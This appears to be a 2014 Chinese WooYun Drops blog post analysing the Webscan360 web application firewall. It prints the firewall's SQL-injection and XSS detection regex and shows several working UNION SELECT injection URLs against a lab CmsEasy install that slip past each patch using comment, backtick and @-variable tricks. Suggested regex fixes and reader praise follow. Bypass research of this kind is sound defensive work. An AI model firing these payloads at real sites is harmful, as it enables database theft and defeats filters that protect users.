<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Webscan360的防御与绕过</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">menmen519</a> <span class="bull">·</span> <time title="2014/11/06 13:51" ui-time="" datetime="2014/11/06 13:51" class="published ng-binding ng-isolate-scope">2014/11/06 13:51</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p>这两天给360做了一个webscan360的总结，结果补丁还没有出来，就被人公布到了91org上面，既然公开了，那我就做一个总结</p><p>首先我们贴上它最新的防御正则</p><pre><code>\&lt;.+javascript:window\[.{1}\\x|&lt;.*=(&amp;#\d+?;?)+?&gt;|&lt;.*(data|src)=data:text\/html.*&gt;|\b(alert\(|confirm\(|expression\(|prompt\(|benchmark\s*?\(.*\)|sleep\s*?\(.*\)|load_file\s*?\()|&lt;[a-z]+?\b[^&gt;]*?\bon([a-z]{4,})\s*?=|^\+\/v(8|9)|\b(and|or)\b\s*?([\(\)'"\d]+?=[\(\)'"\d]+?|[\(\)'"a-zA-Z]+?=[\(\)'"a-zA-Z]+?|&gt;|&lt;|\s+?[\w]+?\s+?\bin\b\s*?\(|\blike\b\s+?["'])|\/\*.*\*\/|&lt;\s*script\b|\bEXEC\b|UNION.+?SELECT@{0,2}(\(.+\)|\s+?.+?|(`|'|").*?(`|'|"))|UPDATE@{0,2}(\(.+\)|\s+?.+?|(`|'|").*?(`|'|"))SET|INSERT\s+INTO.+?VALUES|(SELECT|DELETE)@{0,2}(\(.+\)|\s+?.+?\s+?|(`|'|").*?(`|'|"))FROM(\(.+\)|\s+?.+?|(`|'|").*?(`|'|"))|(CREATE|ALTER|DROP|TRUNCATE)\s+(TABLE|DATABASE)|\/\*.*?\*\/|'
</code></pre><p>首先我们追溯一下：</p><p>方开始的时候并没有这个正则表达式<code>\/\*.*?\*\/|'</code></p><p>所以当时我们可以写为：</p><pre><code>union select/**/1,2,3
</code></pre><p>这里我们用cmseasy举例子</p><p>我们发送url：</p><pre><code>http://192.168.10.70/CmsEasy_5.5_UTF-8_20141015/uploads/index.php?case=archive&amp;act=orders&amp;aid[typeid%60%3d1%20UNION%20SELECT/**/1,2,3,concat(version(),user()),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58 from cmseasy_archive ORDER BY 1%23]=1
</code></pre><p>这时候我们是完全可以取出来敏感信息，成功绕过：</p><p><img alt="enter image description here" img-src="1c5ecd48ef63065e457ed6e2deac8e40bcc3759b.jpg"></p><p>第二次被修补之后加上了后面的正则表达式，导致通篇不能写/**/这样的字符，但是这样真的能防御住吗：</p><p>我们利用mysql的一个特性：</p><pre><code>union select`colum`,2,3 
</code></pre><p>这种特性是完全可以执行的</p><p>所以我们改变一下思路发送url:</p><pre><code>http://192.168.10.70/CmsEasy_5.5_UTF-8_20141015/uploads/index.php?case=archive&amp;act=orders&amp;aid[typeid%60%3d1%20UNION%20SELECT`typeid`,2,3,concat(version(),user()),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58 from cmseasy_archive ORDER BY 1%23]=1
</code></pre><p>这样就成功绕过了：</p><p><img alt="enter image description here" img-src="40cfc05b6f42fcfc1c17e300a0ab55606b5f711e.jpg"></p><p>修补之后：</p><pre><code>union select`colum`,2,3 
</code></pre><p>这种被正则 <code>(</code>|'|").*?(<code>|'|")</code> 这个给过滤了</p><p>下载下来之后，发现正则表达式</p><pre><code>(\(.+\)|\s+?.+?|(`|'|").*?(`|'|"))
</code></pre><p>发现这是后修补了小引号，但是本质问题还是没有变</p><p>在sql中我们还有另外一个特性：</p><pre><code>union select@`1`,2,3
</code></pre><p>这样也是可以执行，那么就成功绕过了：</p><p>所以我们改变一下思路发送url:</p><pre><code>http://192.168.10.70/CmsEasy_5.5_UTF-8_20141015/uploads/index.php?case=archive&amp;act=orders&amp;aid[typeid%60%3d1%20UNION%20SELECT@`typeid`,2,3,concat(version(),user()),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58 from cmseasy_archive ORDER BY 1%23]=1
</code></pre><p><img alt="enter image description here" img-src="e35e6de690f0749d6feb6166120cf337aecdf07c.jpg"></p><p>此时有打了补丁，这时候正则又变成了</p><pre><code>@{0,2}(.+|\(.+\)|\s+?.+?|(`|'|").*?(`|'|"))
</code></pre><p>这个正则的意思修补了刚才的那种类型，但是这个正则真正鸡肋的地方在如果不接小引号，那么这个正则就失效了</p><p>所以我们可以在进行变形处理 <code>union <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="8bf8eee7eee8ffcbba">[email&#160;protected]</a>,2,3</code>这种没有被过滤，直接可以通过 这种形式的是可以在sql语句里面运行的，而且不报错</p><p><code>union <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="9ceff9f0f9ffe8dcad">[email&#160;protected]</a><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="92afd2a3">[email&#160;protected]</a>,2,3</code> 这种也是没有被过滤，直接可以通过，这种也是可以再mysql完美执行的</p><p>发送url:</p><pre><code>http://192.168.10.70/CmsEasy_5.5_UTF-8_20141015/uploads/ index.php?case=archive&amp;act=orders&amp;aid[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="24505d54414d4001121401174015011614716a6d6b6a01161477616861677064505d54414d40">[email&#160;protected]</a>,2,3,concat(version(),user()),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58 from cmseasy_archive ORDER BY 1%23]=10
</code></pre><p><img alt="enter image description here" img-src="ce4645b342ee26899b81e0fd73b804d555e71a63.jpg"></p><p>以上就是webscan360的进化，那么我们来分析一下怎么去修补这个漏洞</p><p>最后我们给出来的正则</p><pre><code>@{0,2}(.+|\(.+\)|\s+?.+?|(`|'|").*?(`|'|"))
</code></pre><p>然后进行测试 成功的拦截了 union select类型的 当然了后面的update类型的 和 insert 类型也要进行相应的改进</p><p>下来让我们在看其他地方一个正则</p><pre><code>INSERT\s+INTO.+?VALUES
</code></pre><p>这个是太传统的写法 其实根据mysql的写法 这个会拦截<code>insert into t values(1,2,3)</code> 但是插入操作不止是这样的写法 <code>insert into t set a=1</code> 这个是不会被拦截的 所以还得加上一个正则</p><pre><code>INSERT\s+INTO.+?(VALUES|SET)
</code></pre><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/7299" rel="bookmark" id="re1">MySQL注入技巧</a></li><li><a href="http://drops.wooyun.org/tips/132" rel="bookmark" id="re2">waf 绕过的技巧</a></li><li><a href="http://drops.wooyun.org/tips/2078" rel="bookmark" id="re3">利用insert，update和delete注入获取数据</a></li><li><a href="http://drops.wooyun.org/tips/8166" rel="bookmark" id="re4">使用exp进行SQL报错注入</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">crazykb</span> <span class="reply-time">2015-05-07 18:15:30</span></div><p></p><p>不好意思 来晚了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Vinc</span> <span class="reply-time">2014-11-18 20:30:33</span></div><p></p><p>是时候出现顶一下了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Mody</span> <span class="reply-time">2014-11-10 11:39:05</span></div><p></p><p>顶个</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">我是壮丁</span> <span class="reply-time">2014-11-07 18:22:53</span></div><p></p><p>膜拜!!!</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">啊L川</span> <span class="reply-time">2014-11-07 14:12:20</span></div><p></p><p>学习了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小飞</span> <span class="reply-time">2014-11-07 13:55:11</span></div><p></p><p>又有一个sql的特性</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">渣渣侠</span> <span class="reply-time">2014-11-07 11:44:33</span></div><p></p><p>膜拜！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">ppt</span> <span class="reply-time">2014-11-06 19:00:53</span></div><p></p><p>最喜欢bypass了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">铁蛋火车侠</span> <span class="reply-time">2014-11-06 16:43:28</span></div><p></p><p>哥 我又来顶了</p><p></p></div></div></div></div></div></main>